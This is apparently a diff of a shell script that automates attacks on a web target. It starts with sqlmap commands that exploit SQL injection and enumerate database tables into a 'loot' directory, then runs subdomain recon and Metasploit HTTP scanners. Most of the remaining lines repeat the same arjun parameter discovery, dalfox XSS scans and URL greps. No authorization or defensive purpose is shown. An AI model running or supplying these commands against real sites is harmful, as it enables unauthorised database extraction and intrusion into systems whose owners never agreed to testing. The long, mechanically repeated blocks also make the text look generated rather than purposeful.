+sqlmap -u "$TARGET/item?cat=1" -p cat --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_cat_tables.txt"
+sqlmap -u "$TARGET/item?q=1" -p q --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_q_tables.txt"
+sqlmap -u "$TARGET/item?query=1" -p query --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_query_tables.txt"
+sqlmap -u "$TARGET/item?search=1" -p search --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_search_tables.txt"
+sqlmap -u "$TARGET/item?sort=1" -p sort --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_sort_tables.txt"
+sqlmap -u "$TARGET/item?filter=1" -p filter --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_filter_tables.txt"
+sqlmap -u "$TARGET/item?ref=1" -p ref --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_ref_tables.txt"
+subfinder -d "$DOMAIN" -s crtsh -o "$HOME/ops/$DOMAIN/recon/subs_crtsh.txt"
+subfinder -d "$DOMAIN" -s hackertarget -o "$HOME/ops/$DOMAIN/recon/subs_hackertarget.txt"
+subfinder -d "$DOMAIN" -s waybackarchive -o "$HOME/ops/$DOMAIN/recon/subs_waybackarchive.txt"
+msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"
+msfconsole -q -x "use auxiliary/scanner/http/http_title; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"
+msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"
+msfconsole -q -x "use auxiliary/scanner/http/robots_txt; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"
+msfconsole -q -x "use auxiliary/scanner/http/backup_file; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"
+msfconsole -q -x "use auxiliary/scanner/http/http_put; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"
+arjun -u "$TARGET/page709" --include "order_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_order_id_709.json"
+dalfox url "$TARGET/search?order_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_order_id_709.txt"
+grep -Ei "order_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_order_id_709.txt"
+arjun -u "$TARGET/page712" --include "q=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_q_712.json"
+dalfox url "$TARGET/search?q=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_q_712.txt"
+grep -Ei "q=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_q_712.txt"
+arjun -u "$TARGET/page715" --include "sort=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_sort_715.json"
+dalfox url "$TARGET/search?sort=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_sort_715.txt"
+grep -Ei "sort=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_sort_715.txt"
+arjun -u "$TARGET/page718" --include "file=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_file_718.json"
+dalfox url "$TARGET/search?file=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_file_718.txt"
+grep -Ei "file=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_file_718.txt"
+arjun -u "$TARGET/page721" --include "redirect=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_redirect_721.json"
+dalfox url "$TARGET/search?redirect=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_redirect_721.txt"
+grep -Ei "redirect=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_redirect_721.txt"
+arjun -u "$TARGET/page724" --include "pid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_pid_724.json"
+dalfox url "$TARGET/search?pid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_pid_724.txt"
+grep -Ei "pid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_pid_724.txt"
+arjun -u "$TARGET/page727" --include "product_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_product_id_727.json"
+dalfox url "$TARGET/search?product_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_product_id_727.txt"
+grep -Ei "product_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_product_id_727.txt"
+arjun -u "$TARGET/page730" --include "cat=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_cat_730.json"
+dalfox url "$TARGET/search?cat=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_cat_730.txt"
+grep -Ei "cat=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_cat_730.txt"
+arjun -u "$TARGET/page733" --include "search=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_search_733.json"
+dalfox url "$TARGET/search?search=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_search_733.txt"
+grep -Ei "search=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_search_733.txt"
+arjun -u "$TARGET/page736" --include "ref=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_ref_736.json"
+dalfox url "$TARGET/search?ref=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_ref_736.txt"
+grep -Ei "ref=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_ref_736.txt"
+arjun -u "$TARGET/page739" --include "url=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_url_739.json"
+dalfox url "$TARGET/search?url=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_url_739.txt"
+grep -Ei "url=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_url_739.txt"
+arjun -u "$TARGET/page742" --include "uid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_uid_742.json"
+dalfox url "$TARGET/search?uid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_uid_742.txt"
+grep -Ei "uid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_uid_742.txt"
+arjun -u "$TARGET/page745" --include "user_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_id_745.json"
+dalfox url "$TARGET/search?user_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_id_745.txt"
+grep -Ei "user_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_id_745.txt"
+arjun -u "$TARGET/page748" --include "page=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_page_748.json"
+dalfox url "$TARGET/search?page=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_page_748.txt"
+grep -Ei "page=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_page_748.txt"
+arjun -u "$TARGET/page751" --include "query=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_query_751.json"
+dalfox url "$TARGET/search?query=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_query_751.txt"
+grep -Ei "query=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_query_751.txt"
+arjun -u "$TARGET/page754" --include "filter=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_filter_754.json"
+dalfox url "$TARGET/search?filter=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_filter_754.txt"
+grep -Ei "filter=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_filter_754.txt"
+arjun -u "$TARGET/page757" --include "path=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_path_757.json"
+dalfox url "$TARGET/search?path=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_path_757.txt"
+grep -Ei "path=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_path_757.txt"
+arjun -u "$TARGET/page760" --include "id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_id_760.json"
+dalfox url "$TARGET/search?id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_id_760.txt"
+grep -Ei "id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_id_760.txt"
+arjun -u "$TARGET/page763" --include "user=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_763.json"
+dalfox url "$TARGET/search?user=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_763.txt"
+grep -Ei "user=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_763.txt"
+arjun -u "$TARGET/page766" --include "order_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_order_id_766.json"
+dalfox url "$TARGET/search?order_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_order_id_766.txt"
+grep -Ei "order_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_order_id_766.txt"
+arjun -u "$TARGET/page769" --include "q=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_q_769.json"
+dalfox url "$TARGET/search?q=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_q_769.txt"
+grep -Ei "q=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_q_769.txt"
+arjun -u "$TARGET/page772" --include "sort=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_sort_772.json"
+dalfox url "$TARGET/search?sort=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_sort_772.txt"
+grep -Ei "sort=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_sort_772.txt"
+arjun -u "$TARGET/page775" --include "file=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_file_775.json"
+dalfox url "$TARGET/search?file=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_file_775.txt"
+grep -Ei "file=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_file_775.txt"
+arjun -u "$TARGET/page778" --include "redirect=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_redirect_778.json"
+dalfox url "$TARGET/search?redirect=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_redirect_778.txt"
+grep -Ei "redirect=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_redirect_778.txt"
+arjun -u "$TARGET/page781" --include "pid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_pid_781.json"
+dalfox url "$TARGET/search?pid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_pid_781.txt"
+grep -Ei "pid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_pid_781.txt"
+arjun -u "$TARGET/page784" --include "product_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_product_id_784.json"
+dalfox url "$TARGET/search?product_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_product_id_784.txt"
+grep -Ei "product_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_product_id_784.txt"
+arjun -u "$TARGET/page787" --include "cat=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_cat_787.json"
+dalfox url "$TARGET/search?cat=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_cat_787.txt"
+grep -Ei "cat=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_cat_787.txt"
+arjun -u "$TARGET/page790" --include "search=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_search_790.json"
+dalfox url "$TARGET/search?search=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_search_790.txt"
+grep -Ei "search=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_search_790.txt"
+arjun -u "$TARGET/page793" --include "ref=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_ref_793.json"
+dalfox url "$TARGET/search?ref=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_ref_793.txt"
+grep -Ei "ref=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_ref_793.txt"
+arjun -u "$TARGET/page796" --include "url=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_url_796.json"
+dalfox url "$TARGET/search?url=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_url_796.txt"
+grep -Ei "url=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_url_796.txt"
+arjun -u "$TARGET/page799" --include "uid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_uid_799.json"
+dalfox url "$TARGET/search?uid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_uid_799.txt"
+grep -Ei "uid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_uid_799.txt"
+arjun -u "$TARGET/page802" --include "user_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_id_802.json"
+dalfox url "$TARGET/search?user_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_id_802.txt"
+grep -Ei "user_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_id_802.txt"
+arjun -u "$TARGET/page805" --include "page=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_page_805.json"
+dalfox url "$TARGET/search?page=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_page_805.txt"
+grep -Ei "page=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_page_805.txt"
+arjun -u "$TARGET/page808" --include "query=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_query_808.json"
+dalfox url "$TARGET/search?query=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_query_808.txt"
+grep -Ei "query=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_query_808.txt"
+arjun -u "$TARGET/page811" --include "filter=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_filter_811.json"
+dalfox url "$TARGET/search?filter=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_filter_811.txt"
+grep -Ei "filter=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_filter_811.txt"
+arjun -u "$TARGET/page814" --include "path=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_path_814.json"
+dalfox url "$TARGET/search?path=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_path_814.txt"
+grep -Ei "path=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_path_814.txt"
+arjun -u "$TARGET/page817" --include "id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_id_817.json"
+dalfox url "$TARGET/search?id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_id_817.txt"
+grep -Ei "id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_id_817.txt"
+arjun -u "$TARGET/page820" --include "user=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_820.json"
+dalfox url "$TARGET/search?user=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_820.txt"
+grep -Ei "user=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_820.txt"
+arjun -u "$TARGET/page823" --include "order_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_order_id_823.json"
+dalfox url "$TARGET/search?order_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_order_id_823.txt"
+grep -Ei "order_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_order_id_823.txt"
+arjun -u "$TARGET/page826" --include "q=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_q_826.json"
+dalfox url "$TARGET/search?q=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_q_826.txt"
+grep -Ei "q=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_q_826.txt"
+arjun -u "$TARGET/page829" --include "sort=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_sort_829.json"
+dalfox url "$TARGET/search?sort=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_sort_829.txt"
+grep -Ei "sort=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_sort_829.txt"
+arjun -u "$TARGET/page832" --include "file=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_file_832.json"
+dalfox url "$TARGET/search?file=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_file_832.txt"
+grep -Ei "file=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_file_832.txt"
+arjun -u "$TARGET/page835" --include "redirect=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_redirect_835.json"
+dalfox url "$TARGET/search?redirect=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_redirect_835.txt"
+grep -Ei "redirect=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_redirect_835.txt"
+arjun -u "$TARGET/page838" --include "pid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_pid_838.json"
+dalfox url "$TARGET/search?pid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_pid_838.txt"
+grep -Ei "pid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_pid_838.txt"
+arjun -u "$TARGET/page841" --include "product_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_product_id_841.json"
+dalfox url "$TARGET/search?product_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_product_id_841.txt"
+grep -Ei "product_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_product_id_841.txt"
+arjun -u "$TARGET/page844" --include "cat=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_cat_844.json"
+dalfox url "$TARGET/search?cat=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_cat_844.txt"
+grep -Ei "cat=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_cat_844.txt"
+arjun -u "$TARGET/page847" --include "search=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_search_847.json"
+dalfox url "$TARGET/search?search=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_search_847.txt"
+grep -Ei "search=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_search_847.txt"
+arjun -u "$TARGET/page850" --include "ref=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_ref_850.json"
+dalfox url "$TARGET/search?ref=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_ref_850.txt"
+grep -Ei "ref=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_ref_850.txt"
+arjun -u "$TARGET/page853" --include "url=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_url_853.json"
+dalfox url "$TARGET/search?url=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_url_853.txt"
+grep -Ei "url=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_url_853.txt"
+arjun -u "$TARGET/page856" --include "uid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_uid_856.json"
+dalfox url "$TARGET/search?uid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_uid_856.txt"
+grep -Ei "uid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_uid_856.txt"
+arjun -u "$TARGET/page859" --include "user_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_id_859.json"
+dalfox url "$TARGET/search?user_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_id_859.txt"
+grep -Ei "user_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_id_859.txt"
+arjun -u "$TARGET/page862" --include "page=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_page_862.json"
+dalfox url "$TARGET/search?page=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_page_862.txt"
+grep -Ei "page=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_page_862.txt"
+arjun -u "$TARGET/page865" --include "query=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_query_865.json"
+dalfox url "$TARGET/search?query=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_query_865.txt"
+grep -Ei "query=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_query_865.txt"
+arjun -u "$TARGET/page868" --include "filter=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_filter_868.json"
+dalfox url "$TARGET/search?filter=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_filter_868.txt"
+grep -Ei "filter=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_filter_868.txt"
+arjun -u "$TARGET/page871" --include "path=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_path_871.json"
+dalfox url "$TARGET/search?path=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_path_871.txt"
+grep -Ei "path=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_path_871.txt"
+arjun -u "$TARGET/page874" --include "id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_id_874.json"
+dalfox url "$TARGET/search?id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_id_874.txt"
+grep -Ei "id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_id_874.txt"
+arjun -u "$TARGET/page877" --include "user=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_877.json"
+dalfox url "$TARGET/search?user=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_877.txt"
+grep -Ei "user=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_877.txt"
+arjun -u "$TARGET/page880" --include "order_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_order_id_880.json"
+dalfox url "$TARGET/search?order_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_order_id_880.txt"
+grep -Ei "order_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_order_id_880.txt"
+arjun -u "$TARGET/page883" --include "q=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_q_883.json"
+dalfox url "$TARGET/search?q=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_q_883.txt"
+grep -Ei "q=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_q_883.txt"
+arjun -u "$TARGET/page886" --include "sort=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_sort_886.json"
+dalfox url "$TARGET/search?sort=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_sort_886.txt"
+grep -Ei "sort=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_sort_886.txt"
+arjun -u "$TARGET/page889" --include "file=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_file_889.json"
+dalfox url "$TARGET/search?file=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_file_889.txt"
+grep -Ei "file=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_file_889.txt"
+arjun -u "$TARGET/page892" --include "redirect=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_redirect_892.json"
+dalfox url "$TARGET/search?redirect=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_redirect_892.txt"
+grep -Ei "redirect=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_redirect_892.txt"
+arjun -u "$TARGET/page895" --include "pid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_pid_895.json"
+dalfox url "$TARGET/search?pid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_pid_895.txt"
+grep -Ei "pid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_pid_895.txt"
+arjun -u "$TARGET/page898" --include "product_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_product_id_898.json"
+dalfox url "$TARGET/search?product_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_product_id_898.txt"
+grep -Ei "product_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_product_id_898.txt"
+arjun -u "$TARGET/page901" --include "cat=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_cat_901.json"
+dalfox url "$TARGET/search?cat=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_cat_901.txt"
+grep -Ei "cat=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_cat_901.txt"
+arjun -u "$TARGET/page904" --include "search=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_search_904.json"
+dalfox url "$TARGET/search?search=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_search_904.txt"
+grep -Ei "search=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_search_904.txt"
+arjun -u "$TARGET/page907" --include "ref=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_ref_907.json"
+dalfox url "$TARGET/search?ref=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_ref_907.txt"
+grep -Ei "ref=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_ref_907.txt"
+arjun -u "$TARGET/page910" --include "url=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_url_910.json"
+dalfox url "$TARGET/search?url=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_url_910.txt"
+grep -Ei "url=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_url_910.txt"
+arjun -u "$TARGET/page913" --include "uid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_uid_913.json"
+dalfox url "$TARGET/search?uid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_uid_913.txt"
+grep -Ei "uid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_uid_913.txt"
